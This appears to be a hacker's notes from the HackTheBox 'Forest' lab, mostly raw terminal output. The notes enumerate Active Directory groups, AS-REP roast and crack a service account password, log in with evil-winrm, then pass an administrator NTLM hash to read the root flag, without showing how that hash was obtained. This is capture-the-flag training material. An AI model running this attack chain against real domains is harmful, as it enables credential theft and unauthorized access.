[V] Running command: net rpc group members 'Organization Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Organization Management' (RID: 1104) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
Group 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Records Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Security Administrator' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Admins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Enterprise Admins' (RID: 519) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'test' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Schema Admins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Schema Admins' (RID: 518) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'DnsUpdateProxy' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Admins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Domain Admins' (RID: 512) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Read-only Domain Controllers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Cloneable Domain Controllers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Windows Permissions' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Recipient Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Computers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Domain Computers' (RID: 515) has member: HTB\EXCH01$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members '$D31000-NSEL5BRJ63V7' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Hygiene Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Public Folder Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'ExchangeLegacyInterop' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Protected Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Server Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Delegated Setup' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Discovery Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Group Policy Creator Owners' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Trusted Subsystem' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$

 ======================================================================= 
|    Users on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.10.161 with command: rpcclient -W '' -U''%'' '10.10.10.161' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.10.161 with command: rpcclient -W '' -U''%'' '10.10.10.161' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.10.161    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.10.161' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Feb 10 04:30:46 2023


now that we have some users that have been enumerated with enum4linux, we can use GetNPUsers.py from impacket to get the the hash

──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt                                                                                                                          1 ⨯

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:9165b9cd11f40b8b9cc7204555737fa5$9f2a8b3c73c33098b715fb73765985ea0037d675e50624a7bd50a0e822bdc39f6c6fd6f400342627e85b413d7512649dc6517647191a633ee956af66c5e2c0d1f8a80e94fb047f19a7664b3d3d666b62085f4a5cc716828c25aa26117acf8e4ddcc0e8ac1ec4e1b22ff76b4f9128f86c6a4177b59184720ed770890da72136b375929dfe0792e979fa0891a43e50dfb991bfea03a95a697c0e38bc824e9af77e17f307a8095b6b4a2fb56a2bb5f297d79482087db7b56cb15dedf0528afa4d62daeabc5701f259fe4d6a9fd4eb498b8894d576ed24bb6a47f40dace660689d2d7bf12ecf1e67
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set


we can use john to crack the hash:

                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Practice/HackTheBox/Forrest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2023-02-10 04:50) 0.3891g/s 1589Kp/s 1589Kc/s 1589KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


now that we have the password, we use evil-winrm to log in as svc-alfresco

┌──(kali㉿kali)-[~/Practice/HackTheBox/Forrest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'         

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

user txt:
6433a7b79bdd929e416dab38bcd04a45

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2023   1:27 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
6433a7b79bdd929e416dab38bcd04a45



Privesc:


Local exploit suggester:






*] 10.10.10.161 - Valid modules for session 3:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.




┌──(kali㉿kali)-[~/Documents/tools/impacket-0.9.19/examples]
└─$ evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6                                                                             1 ⨯


Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd Desktop
Cannot find path 'C:\Users\Administrator\Documents\Desktop' because it does not exist.
At line:1 char:1
+ cd Desktop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Documents\Desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2023   1:27 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3d599c0334f1c384b8aaa75d6d00cdf4
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3d599c0334f1c384b8aaa75d6d00cdf4
